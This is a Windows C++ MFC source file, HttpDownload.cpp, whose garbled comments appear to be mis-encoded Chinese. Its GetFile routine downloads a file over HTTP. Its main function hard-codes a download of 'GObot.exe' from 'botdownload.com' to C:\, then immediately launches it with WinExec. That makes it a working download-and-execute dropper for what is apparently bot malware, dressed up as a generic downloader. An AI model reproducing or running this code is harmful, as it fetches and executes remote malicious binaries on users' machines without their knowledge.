// HttpDownload.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "HttpDownload.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// The one and only application object

CWinApp theApp;

using namespace std;

INT GetFile(const CString strUrl,const CString strSavePath)
{
	//��鴫�����������
	if (strUrl.IsEmpty())
		return -5;
	if (strSavePath.IsEmpty())
		return -6;

	unsigned short nPort;		//���ڱ���Ŀ��HTTP����˿�
	CString strServer, strObject;	//strServer���ڱ����������ַ��strObject���ڱ����ļ���������
	DWORD dwServiceType,dwRet;		//dwServiceType���ڱ���������ͣ�dwRet���ڱ����ύGET���󷵻ص�״̬��

	//����URL����ȡ��Ϣ
	if(!AfxParseURL(strUrl, dwServiceType, strServer, strObject, nPort))
	{
		//����ʧ�ܣ���Url����ȷ
		return -1;
	}
	//�����������Ӷ���HTTP���Ӷ���ָ������ڸ����ӵ�HttpFile�ļ�����ָ�룬ע��delete
	CInternetSession intsess;
	CHttpFile *pHtFile = NULL;
	//������������
	CHttpConnection *pHtCon = intsess.GetHttpConnection(strServer,nPort);
	if(pHtCon == NULL)
	{
		//������������ʧ��
		intsess.Close();
		return -2;
	}
	//����GET����
	pHtFile = pHtCon->OpenRequest(CHttpConnection::HTTP_VERB_GET,strObject);
	if(pHtFile == NULL)
	{
		//����GET����ʧ��
		intsess.Close();
		delete pHtCon;pHtCon = NULL;
		return -3;
	}
	//�ύ����
	pHtFile->SendRequest();
	//��ȡ���������ص�״̬��
	pHtFile->QueryInfoStatusCode(dwRet);
	if (dwRet != HTTP_STATUS_OK)
	{
		//����������������
		intsess.Close();
		delete pHtCon;pHtCon = NULL;
		delete pHtFile;pHtFile = NULL;
		return -4;
	}
	//��ȡ�ļ���С
	UINT nFileLen = (UINT)pHtFile->GetLength();
	DWORD dwRead = 1;		//���ڱ�ʶ���˶��٣�Ϊ1��Ϊ�˽���ѭ��
	//����������
	CHAR *szBuffer = new CHAR[nFileLen+1];
	TRY 
	{
		//�����ļ�
		CFile PicFile(strSavePath,CFile::modeCreate|CFile::modeWrite|CFile::shareExclusive);
		while(dwRead>0)
		{  
			//��ջ�����
			memset(szBuffer,0,(size_t)(nFileLen+1));
			//��ȡ��������
			dwRead = pHtFile->Read(szBuffer,nFileLen); 
			//д�뵽�ļ�
			PicFile.Write(szBuffer,dwRead);
		}
		//�ر��ļ�
		PicFile.Close();
		//�ͷ��ڴ�
		delete []szBuffer;
		delete pHtFile;
		delete pHtCon;
		//�ر���������
		intsess.Close();
	}
	CATCH(CFileException,e)
	{
		//�ͷ��ڴ�
		delete []szBuffer;
		delete pHtFile;
		delete pHtCon;
		//�ر���������
		intsess.Close();
		return -7;			//��д�ļ��쳣
	}
	END_CATCH
		return 0;
}


int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	int nRetCode = 0;

	HMODULE hModule = ::GetModuleHandle(NULL);

	if (hModule != NULL)
	{
		// initialize MFC and print and error on failure
		if (!AfxWinInit(hModule, NULL, ::GetCommandLine(), 0))
		{
			// TODO: change error code to suit your needs
			_tprintf(_T("Fatal Error: MFC initialization failed\n"));
			nRetCode = 1;
		}
		else
		{
			// TODO: code your application's behavior here.
			CString strUrl;
			strUrl= "http://botdownload.com/GObot.exe";
			CString strSavePath;
			strSavePath= "C:\\GObot.exe";
			GetFile(strUrl, strSavePath);
			WinExec("C:\\GObot.exe",SW_SHOWNORMAL); 
			
		}
	}
	else
	{
		// TODO: change error code to suit your needs
		_tprintf(_T("Fatal Error: GetModuleHandle failed\n"));
		nRetCode = 1;
	}

	return nRetCode;
}
